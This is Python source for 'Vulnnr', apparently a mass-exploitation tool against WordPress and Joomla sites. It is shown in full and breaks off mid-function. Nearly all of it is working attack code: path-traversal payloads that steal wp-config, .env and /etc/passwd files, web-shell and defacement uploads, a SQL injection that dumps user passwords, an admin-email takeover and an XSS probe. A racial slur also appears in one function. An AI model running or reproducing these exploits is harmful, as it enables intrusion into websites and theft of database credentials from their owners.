import os, requests, colorama, socket, getpass, subprocess, json, time, re, datetime, random, threading, io, multiprocessing
import urllib3, sys
from Exploits.com_bjcontact import bj
from random import sample as rand
from random import *

from Exploits.CVE202126723 import Jenzabar
from Exploits.Hrsale import *
from modules.search import dorker
from Exploits.CVE202011731 import Media
from bs4 import BeautifulSoup
from Exploits.eCommerce import eCommerce
from googlesearch import search
from Exploits.asistorage import asistorage
import dnsdmpstr
from dnsdmpstr import *
from modules.dirscan import dirscan
import Exploits.colors
from multiprocessing import Pool, freeze_support
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import Fore
from colorama import init
dnsdump = dnsdmpstr()
init()

YELLOW = Fore.YELLOW
GREEN  = Fore.GREEN
RED = Fore.RED
LIGHTRED = Fore.LIGHTRED_EX
PURPLE = Fore.LIGHTMAGENTA_EX
RESET = Fore.RESET
CYAN = Fore.CYAN
now = datetime.datetime.now()
year = now.strftime('%Y')
month = now.strftime('%m')
site = "www.fedsearch.xyz"
Version = "1.2.9"
timeout = 8


HEADERS = {
    'User-Agent': 'Vulnnr-WIN!10',
    'Content-type' : '*/*',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

def banner():
    os.system("cls;clear")
    #print(f"""
            #{YELLOW}______________________________\n
             #      {YELLOW} [ {RED}~ {CYAN}Vulnnr {RED}~ {YELLOW}]  \n
            #   {YELLOW} [ {RED}~ {CYAN}Creator Nano {RED}~ {YELLOW}]   \n    
           #        {YELLOW} [ {RED}~ {CYAN}V 1.0 {RED}~ {YELLOW}]      
          #  ______________________________
         #        {RESET}Try the help command {RED}!{RESET}
                                                                  
    
    
    #""")
    
    print(f""" 
     {GREEN},_,{PURPLE}        .       .   .   
    {GREEN}(O,O){PURPLE}        \     /    |  
    {GREEN}(   ){PURPLE}         \   /.  . | .--. .--. .--. {RED} ~ {RESET}Creator: {GREEN}Nano{PURPLE}
    {RESET}-{GREEN}"-"{RESET}----{PURPLE}       \ / |  | | |  | |  | |    {RED} ~ {RESET}Version: {GREEN}v{Version}{PURPLE}
                    '  `--`-`-'  `-'  `-'    {RED} ~ {RESET}Website: {GREEN}{site}{PURPLE}\n
                  {RESET}try {YELLOW}help {RESET}for more options
    
    """)



 
banner()


def proxyss():
    response = requests.get("https://sslproxies.org/")
    soup = BeautifulSoup(response.content, 'html5lib')
    proxy = {'https': choice(list(map(lambda x:x[0]+':'+x[1], list(zip(map(lambda x:x.text, 
    soup.findAll('td')[::8]), map(lambda x:x.text, soup.findAll('td')[1::8]))))))}
    return proxy

proxy = proxyss()
def autoupdate():
    print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Checking for updates...")
    test = requests.get("https://github.com/X-x-X-0/Vulnnr/blob/main/checks.txt")
    time.sleep(3)
    if Version in test.text:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}looks like u are using Vulnnr v{Version} upto date!")
        time.sleep(3)
        os.system('cls;clear')
        banner()
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}looks like u are using Vulnnr v{Version}, sadly that is currently out of date please update repo!")
        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {GREEN}https://github.com/X-x-X-0/Vulnnr.git")
        sys.exit()
autoupdate()

dirs = [
    '/wp-content/wpclone-temp/wpclone_backup/',
    '/wp-config2.txt',
    '/wp-config.txt',
    '/wp-backup.txt',
    '/WORDPRESS.txt',
    '/wordpress.txt',
    '/Wordpress.txt',
    '/__MACOSX/',
    '/phpinfo.php',
    '/wordpress/wp-admin/',
    '/wp-content/wpbackitup_backups',
    '/backup',
    '/wp-login.php',
    '/wp-json/wp/v2/users/',
    '/wp-config.php.save',
    '/wp-config.php_bak',
    '/wp-config.save',
    '/connectors/resource/s_eval.php',
    '/vendor/phpunit/phpunit/build.xml',
    '/wp-content/vendor/phpunit/phpunit/build.xml',
    '/wp-admin/setup-config.php?step=0',
    '/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media',
    '/wp-admin/setup-config.php',
    '/wp-admin/admin-ajax',
    '/wp-content/plugins/wp-dbmanager/',
    '/blog/wp-content/plugins/wp-dbmanager/',
    '/blog/wp-content/wpclone-temp/wpclone_backup/',
    'wp13.txt',
    '/wp-content/debug.log',
    '/administrator/components/com_admin/',
    'error_log',
    'error_log.log',
    '/fileupload/',
    '/admin/upload',
    '/admin/uploader',
    '/uploader.php',
    '/image.php',
    '/partyupload/',
    '/adminpanel/',
    '/uploadimage.php',
    '/downloader/',
    '/userupload/',
    '/users.php',
    '/fileuploader/',
    '/fileupload.php',
    '/filemanager.php',
    '/filemanger/',
    '/uploads/shell.php',
    '/admin/uploads/shell.php',
    '/phpMyBackup',
    '/phpmybackup',
    '/wp-content/uploads/private'
]
dorks = [
    '/plc/webvisu.htm',
    '/telerik.web.ui.webresource.axd?type=rau',
    '/CFIDE/adminapi',
    '/cgi-bin/guestimage.html',
    '/gnc/API_External_Services.cfc',
    '/config.php_old'
]

DowloadConfig = [
 '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=cpabc_appointments_calendar_update&cpabc_calendar_update=1&id=../../../../../../wp-config.php',
 '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes',
 '/wp-admin/admin.php?page=multi_metabox_listing&action=edit&id=../../../../../../wp-config.php',
 '/wp-content/force-download.php?file=../wp-config.php',
 '/force-download.php?file=wp-config.php',
 '/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php',
 '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&file=../../../../wp-config.php',
 '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
 '/wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=../../wp-config.php',
 '/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=../../../../wp-config.php',
 '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
 '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../wp-config.php',
 '/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php',
 '/wp-content/plugins/tera-charts/charts/treemap.php?fn=../../../../wp-config.php',
 '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
 '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
 '/cs/wp-content/themes/mTheme-Unus/css.php?files=../../../../wp-config.php',
 '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?path=../../../../../wp-config.php',
 '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php',
 '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
 '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
 '/wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php',
 '/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download',
 '/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd',
 '/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
 '/wp/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
 '/wordpress/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
 '/.env',
 '/wp-admin/admin.php?page=supsystic-backup&tab=bupLog&download=../wp-config.php',
 '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php',
 '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php',
 '/index.php?option=com_cckjseblod&task=download&file=configuration.php',
 '/downloader.php?filename=../../../../../../etc/passwd',
 '/download.php?filename=../../../../../../etc/passwd',
 '/down.php?filename=../../../../../../etc/passwd',
 '/download.php?file=../../../../../../etc/passwd',
 '/downloader.php?file=../../../../../../etc/passwd',
 '/downloads.php?file=../../../../../../etc/passwd',
 '/down.php?file=../../../../../../etc/passwd',
 '/download.php?file_name=../../../../../../etc/passwd',
 '/downloader.php?file_name=../../../../../../etc/passwd',
 '/down.php?file_name=../../../../../../etc/passwd',
 '/index.php?file=../../../../../../etc/passwd',
 '/admin/downloader.php?file=../../../../../../etc/passwd',
 '/admin/libs/download.php?file=../../../../../../etc/passwd',
 '/test.php?file=../../../../../../etc/passwd',
 '/test.php?filename=../../../../../../etc/passwd',
 '/lib/download.php?file_name=../../../../../../etc/passwd',
 '/lib/downloader.php?file_name=../../../../../../etc/passwd',
 '/lib/download.php?file=../../../../../../etc/passwd',
 '/lib/download.php?name=../../../../../../etc/passwd',
 '/download.php?name=../../../../../../etc/passwd',
 '/SEACMS111/5f9js3/admin_safe.php?action=download&file=../../../../../../etc/passwd',
 '/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00',
 '/index.php?option=com_realtyna&controller=../../../../../../../../../../etc/passwd%00',
 '/fhem/FileLog_logWrapper?dev=Logfile&file=/etc/passwd&type=text',
 '/index.php?page=/etc/passwd',
 '/imgsize.php?img=/etc/passwd&w=0',
 '/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd',
 '/index.php?action=../../../../../../../etc/passwd',
 '/index.php?p=../../../../../../../etc/passwd',
 '/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file=/etc/passwd',
 '/faq.php?show=/etc/passwd&c=guidelines',
 '/blog/faq.php?show=/etc/passwd&c=guidelines',
 '/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd',
 '/index.php?page_slug=../../../../../etc/passwd%00',
 '/?op=page&tmpl=../../../../../../../etc/passwd',
 '/sh-cdn/yazi.php?yazi=/etc/passwd',
 'small.php?section=/etc/passwd',
 '/kmrs/exportmanager/ajax/getfiles?f=/../../../../../../../../../../etc/passwd',
 '/exportmanager/ajax/getfiles?f=/../../../../../../../../../../etc/passwd',
 '/webmail/calendar/minimizer/index.php?style=/etc/passwd',
 '/calendar/minimizer/index.php?style=/etc/passwd',
 '/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd',
 '/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/',
 '/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd',
 '/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties',
 '/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28"XSS"%26%23x29%3B%3C/x:script%3E',
 '/gotoURL.asp?url=fedsearch.xyz&id=43569'
]



def config(url, path):
    try:
        Exp = url + str(path)
        GetConfig = requests.get(Exp, headers=HEADERS, timeout=timeout)
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
        if GetConfig.status_code == 200:
            if "DB_NAME" in GetConfig.text:

                with io.open(filename, "a+", encoding="utf-8") as f:
                    #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
                    f.write(f"\nDB RESULTS:\n{GetConfig.text}\n")
                f.close()
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}wp-configs ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
            elif "DB_HOST" in GetConfig.text:

                with io.open(filename, "a+", encoding="utf-8") as f:
                    #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
                    f.write(f"\nEnv RESULTS:\n{GetConfig.text}\n\n\n")
                f.close()
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Env config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
            elif "JConfig" in GetConfig.text:
                with io.open(filename, "a+", encoding="utf-8") as f:
                    #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
                    f.write(f"\nEnv RESULTS:\n{GetConfig.text}\n\n\n")
                f.close()
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Joomla config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
            if "root:x" in GetConfig.text:
                filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
                with io.open(filename, "a+", encoding="utf-8") as f:
                        #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
                    f.write(f"\nLFI RESULTS:\n{GetConfig.text}\n\n\n")
                f.close()
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}LFI config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
            elif "ctpDataSource.password" in GetConfig.text:
                filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
                with io.open(filename, "a+", encoding="utf-8") as f:
                        #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
                    f.write(f"\nLFI RESULTS:\n{GetConfig.text}\n\n\n")
                f.close()
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}LFI config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
            elif "XSS" in GetConfig.text:
                print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}XSS {PURPLE}=> {RESET}{GetConfig.url}")
            elif "fedsearch" in GetConfig.text:
                print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Open REDI {PURPLE}=> {RESET}{GetConfig.url}")
    except:
        #print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout\n")
        return






def com_s5(url):
    xp = url + '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='
    GetConfig = requests.get(xp, timeout=10)
    if 'JConfig' in str(GetConfig.content):
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        
        with open(filename, "a+") as f:
            f.write(f"LFI: {GetConfig.url}\n")
            f.write(GetConfig.text)
        f.close()
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}s5_media_player LFI {PURPLE}=>{RESET} {GREEN}Vuln saved to {GREEN}" + filename)
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}s5_media_player LFI {PURPLE}=>{RESET} {RED}Not Vuln")

def com_alberghi(url):
    Jce_Deface_image = "shell/hatelife.gif"
    fileDeface = {'userfile': open(Jce_Deface_image, 'rb')}
    Exp = url + '/administrator/components/com_alberghi/upload.alberghi.php'
    Check = requests.get(Exp, timeout=10)
    if 'class="inputbox" name="userfile"' in str(Check.content):
        Post = requests.post(Exp, files=fileDeface, timeout=10)
        if 'has been successfully' or 'already exists' in str(Post.content):
            CheckIndex = requests.get(site + '/administrator/components/com_alberghi/' + Jce_Deface_image.split('/')[1], timeout=10)
            if 'GIF89a' in str(CheckIndex.content):
                filename = "Results/shells.txt"
                with open(filename, "a+") as f:
                    f.write(url + '/administrator/components/com_alberghi/' + Jce_Deface_image.split('/')[1] + '\n')
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}com_alberghi Exploit {PURPLE}=> {GREEN}Vuln{RESET} shell saved to {filename}")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}] {RESET}com_alberghi {PURPLE}=> {RED}Not Vuln ")
        

        
def fileup(url):
    
    defaceFile = {'Filedata': (
                      'VuLLnr.txt', open('shell/vuln.txt', 'rb'), 'text/html')
           }
    x = requests.post(url + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php', files=defaceFile, timeout=timeout)
    if 'id="wpvimgres"' in x.text:
        uploader = url + '/wp-content/uploads/' + year + '/' + month + '/VuLLnr.txt'
        GoT = requests.get(uploader, timeout=timeout)
        find = re.findall('<img src="http://(.*)" height="', x.text)
        GoT2 = requests.get('http://' + find[0], timeout=timeout)
        if 'Vulnnr on top' in GoT.text:
            filename = "Results/shells.txt"
            with open(filename, "a+") as f:
                f.write(uploader + '\n')
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}viral-optins Exploit {PURPLE}=> {GREEN}Vuln{RESET} shell saved to {filename}")
        else:
            if 'Vulnnr on top' in GoT2.text:
                filename = "Results/shells.txt"
                with open(filename, "a+") as f:
                    f.write(uploader + '\n')
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}viral-optins Exploit {PURPLE}=> {GREEN}Vuln{RESET} shell saved to {filename}")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}] {RESET}viral-optins {PURPLE}=> {RED}Not Vuln ")

    



def dirsscan(url, path):
    try:
        Exp = url + str(path)
        GetConfig = requests.get(Exp, headers=HEADERS, timeout=timeout)
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
        if "404" in GetConfig.text:
            pass
        else:
            if "Checking Browser" in GetConfig:
                pass
            else:

                if GetConfig.status_code == 200:
                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url}")
                if "File Upload Manager" in GetConfig.text:
                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}Might be a file upload? ")
                if "Backup-Management (phpMyBackup v.0.4 beta * )" in GetConfig.text:
                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}phpMyBackup v.0.4 ")
                if "Index of" in GetConfig.text:
                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}Open directory ")
                
        
    except:
        #print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout\n")
        return

        
    
def dorkinfos(url, path):
    Exp = url + str(path)
    GetConfig = requests.get(Exp, headers=HEADERS, timeout=timeout)
    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
    if GetConfig.status_code == 200:
        if "404" in GetConfig.text:
            pass
        elif "file not found" in GetConfig.text:
            pass
        elif "CoDeSys WebVisualization" in GetConfig.text:
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}(PLC/SCADA web visual interface)")
        elif "RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly.":
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}https://github.com/noperator/CVE-2019-18935")
        elif "Index of /CFIDE/adminapi" in GetConfig.text:
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}")
        elif "Camera Live Image" in GetConfig.text:
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET} | {YELLOW}IP Cameras")
        elif "Adobe, the Adobe logo, ColdFusion, and Adobe ColdFusion are trademarks or registered trademarks of Adobe" in GetConfig.text:
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET} | {YELLOW}Contains Login Portals")



        

def dorkinfo(url):
    global flag
    thread = []
    flag = False
    for path in dorks:
        if not flag == False:
            return 
        t = threading.Thread(target=dorkinfos, args=(url, path))
        t.start()
        thread.append(t)
        

    for j in thread:
        j.join()

    if flag == False:
        return 
    


def Exploit(url):
    global flag
    thread = []
    flag = False
    for path in DowloadConfig:
        if not flag == False:
            return 
        t = threading.Thread(target=config, args=(url, path))
        t.start()
        thread.append(t)
        

    for j in thread:
        j.join()

    if flag == False:
        return 


def dirs2(url):
    global flag
    thread = []
    flag = False
    for path in dirs:
        if not flag == False:
            return 
        t = threading.Thread(target=dirsscan, args=(url, path))
        t.start()
        thread.append(t)
        

    for j in thread:
        j.join()

    if flag == False:
        return 

### thumbnailSlider Exploit is broken bc i am shit coder, if u want to try and fix the error remove the try statement at the auto def
def wp_thumbnailSlider(url):
        with open('shell/hatelife.gif', 'rb') as img:
            name_img = os.path.basename('shell/hatelife.gif')
            files = {
                'image': (name_img, img, 'multipart/form-data', {'Expires': '0'})}
            upload_file = requests.post(url, files=files,headers=HEADERS,verify=False)
            fname = re.findall(re.compile(r'/slider\/(.*\.gif)/'), upload_file)
            if fname:
                dump_data = url + "wp-content/uploads/wp-responsive-images-thumbnail-slider/"+fname
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}thumbnailslider Upload {PURPLE}=> {GREEN}Vuln")
                return dict(
                    url=url,
                    name="Thumbnail Slider",
                    status=True,
                    shell=dump_data
                )
            else:
                print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}thumbnailslider Upload {PURPLE}=> {RED}Not Vuln")
                return dict(
                    url=url,
                    name="Thumbnail Slider",
                    status=False
                )


def autoadmin(url):
    exploit = '/?up_auto_log=true'
    admin_re_page = url + '/wp-admin/'
    requests.get(url + exploit, timeout=timeout, headers=HEADERS)
    Check_login = requests.get(admin_re_page, timeout=10, headers=HEADERS)
    if '<li id="wp-admin-bar-logout">' in str(Check_login.content):
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}autoadmin {PURPLE}=> {GREEN}Vuln {RESET}| {url}{exploit} ")
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}autoadmin {PURPLE}=> {RED}Not Vuln")

def com_portfolio(url):
    PostFile = {'Filedata': open('shell/hateme.php', 'rb')
    }
    requests.post(url+'/administrator/components/com_bt_portfolio/helpers/uploadify/uploadify.php', files=PostFile, timeout=timeout, headers=HEADERS)
    test = requests.get(url+'/administrator/components/com_bt_portfolio/hateme.php', timeout=timeout, headers=HEADERS)
    if "Vulnnr on yo forehead" in test.text:
        filename = "Results/shells.txt"
        with open(filename, "a+") as f:
            f.write(url + '/administrator/components/com_bt_portfolio/hateme.php?cmd=uname -a' + '\n')
        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} com_portfolio {PURPLE}=> {GREEN}Vuln {RESET}shell saved to {GREEN}{filename}")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} com_portfolio {PURPLE}=> {RED}Not vuln")


def Spreedsheet(url):
    test = requests.get(url+"/wp-content/plugins/wpSS/ss_load.php", timeout=timeout)
    if "WordPress Spreadsheet" in test.text:
        User_Pass = re.findall('<title>(.*)</title>', test.content)
        username = User_Pass[1].split(':')[0]
        password = User_Pass[1].split(':')[1]
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | wp-username: {str(username)} wp-password: {str(password)}{GREEN}{url}?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain")
    else:  
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}wpSS SQL {PURPLE}=> {RED}Not Vuln")

def revexploit(url):
        exploit = requests.get(url + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",  timeout=timeout)
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
        if "invalid file" in exploit.text:
            with open(filename, "a+") as f:
                f.write(exploit.url)
            f.close()

        if exploit.status_code == 200:
            if "<?php" in exploit.text:
                with open(filename, "a+") as f:
                    f.write(exploit.text)
                f.close()
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Revslider exploit {PURPLE}=>{RESET} Database config has been saved to {GREEN}%s" % filename)
        else: # else any other HTTP reponse means site is not vulnerable!
             print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}RevSlider exploit {PURPLE}=> {RED}Not Vuln")

def eshop(url):
        exploit = requests.get(url + "/wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php", timeout=timeout)
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
        if exploit.status_code == 200:
            if "DB_PASSWORD" in exploit.text:
                with open(filename, "a+") as f:
                    f.write(exploit.text)
                f.close()
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}eshop exploit {PURPLE}=>{RESET} Database config has been saved to {GREEN}%s" % filename)
        else: # else any other HTTP reponse means site is not vulnerable!
             print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}eshop exploit {PURPLE}=>{RESET} {RED}Not Vuln")



def com_media(url):
        list = ['i', 'hate', 'niggers']
        endpoint = url+"/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder="
        HEADERS = {"content-type": "form-data"}
        fieldname = 'Filedata[]'
        shell = open('shell/candyman.txt','rb')
        data = {
                fieldname:shell,
        }
        requests.post(endpoint, data=data, headers=HEADERS,verify=False, timeout=timeout).text
        dump_data = endpoint+"/images/candyman.txt"
        response = requests.get(dump_data,HEADERS,verify=False).text
        lol = requests.get(url+"/images/candyman.txt")
        if re.findall(r'Tig', response):
            return dict(
                url=url,
                name="com_media",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_media",
                status=False
            )
 
def wp_jobmanager(url):
        regex = re.compile(r'image\/gif')
        endpoint = url + "/jm-ajax/upload_file/"
        image = open('shell/hatelife.gif', 'rb')
        field = "file[]"
        HEADERS['content-type'] = 'multipart/form-data'
        options = {
            field: image
        }
        HEADERS['Content_Type'] = 'multipart/form-data'
        requests.post(endpoint, data=options,headers=HEADERS,verify=False, timeout=timeout).text
        dump_data = url + "/wp-content/uploads/job-manager-uploads/file/" + \
            year+"/"+month+"/hatelife.gif"
        response = requests.get(dump_data,headers=HEADERS,verify=False, timeout=timeout)
        res = response.headers['content-type']
        check_jobmanager = re.findall(regex, res)
        if check_jobmanager:

            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Jobmanager Upload {PURPLE}=>{RESET} {GREEN}Vuln")
            filename = "Results/shells.txt"
            with open(filename, "a+") as f:
                f.write(dump_data.url)
            f.close()

            return dict(
                url=url,
                name="Job Manager    ",
                status=True,
                shell=dump_data
            )
        else:
            print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Jobmanager Upload {PURPLE}=>{RESET} {RED}Not Vuln")
            return dict(
                url=url,
                name="Job Manager     ",
                status=False
            )

def tutor(url):
    test = requests.get(url+"/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd")
    if test.status_code == 200:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        if "root:x" in test.text:
            with open(filename, "a+") as f:
                f.write(f"EXPLOIT: {test.url}\n\n")
                f.write(test.text)
            f.close()
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}tutor LFI {PURPLE}=>{RESET} {GREEN}Vuln saved to {GREEN}" + filename)
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}tutor LFI {PURPLE}=>{RESET} {RED}Not Vuln")



def Localize(url):
    test = requests.get(url+"/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd")
    if test.status_code == 200:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        if "root:x" in test.text:
            with open(filename, "a+") as f:
                f.write(f"EXPLOIT: {test.url}\n\n")
                f.write(test.text)
            f.close()
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Localize LFI {PURPLE}=>{RESET} {GREEN}Vuln saved to {GREEN}" + filename)
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Localize LFI {PURPLE}=>{RESET} {RED}Not Vuln")




def photog(url):
    test = requests.get(url+"/wp-content/plugins/photo-gallery")
    if test.status_code == 200:
        if "albumsgalleries" in test.text:
            
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{url}/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=<SQLi+HERE>&width=785&height=550&bwg_nonce=9e367490cc")
    else:  
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}photo-gallery SQL {PURPLE}=>{RESET} {RED}Not Vuln")

def autosuggest(url):
    '''
    Exploit https://www.exploit-db.com/exploits/45977
    '''
    test = requests.get(url+"/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&")
    if test.status_code == 403:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{test.url}?wpas_action=query&wpas_keys=1")
    else:
        
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}autosuggest SQL {PURPLE}=>{RESET} {RED}Not Vuln")


def admintakeover(url):
    email = "n1337testing@protonmail.com"
    GET = requests.get(url+"/wp-admin/admin-ajax.php")
    AjaxTokEN = re.findall('"ajaxSecurity":"(.*)"', str(GET.content))[0]
    payload = {'action': 'wpgdprc_process_action','security': str(AjaxTokEN)}
    payload['data'] = json.dumps({'type': 'save_setting',
        'append': False,
        'option': 'new_admin_email',
        'value': email
        })
    GG = requests.post(url+"/wp-admin/admin-ajax.php", headers=HEADERS, data=payload)
    if '{"message":"","error":""}' in str(GG.content):
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}admin_email_reset {PURPLE}=>{RESET} {GREEN}Vuln{RESET} sent email to {CYAN}{email}")
        pass
    else:
